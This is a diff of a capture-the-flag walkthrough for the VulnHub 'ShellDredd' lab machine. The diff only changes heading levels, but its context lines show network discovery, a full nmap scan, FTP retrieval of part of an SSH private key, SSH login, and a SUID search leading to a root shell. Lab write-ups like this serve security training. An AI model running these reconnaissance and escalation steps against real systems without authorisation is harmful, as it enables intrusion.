@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.108
@@ -67,7 +65,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 5.21 seconds
 ```
 
-### FTP Access
+## FTP Access
 
 ```
 $ ftp 192.168.1.108
@@ -116,7 +114,7 @@ HvHD9hkCPIq7Sc/TAAAADXJvb3RAT2ZmU2hlbGwBAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-### SSH Access
+## SSH Access
 
 ```
 $ ssh -i id_rsa hannah@192.168.1.108 -p61000
@@ -133,7 +131,7 @@ hannah@ShellDredd:~$
 ```
 
 
-### Privilege Escalation
+## Privilege Escalation
 
 ```
 hannah@ShellDredd:~$ find / -type f -perm -u=s 2>/dev/null
@@ -185,7 +183,7 @@ Process 2016 detected
 root@ShellDredd:~#
 ```
 
-### Flag Acquiring
+## Flag Acquiring
 
 ```
 hannah@ShellDredd:~$ cat user.txt
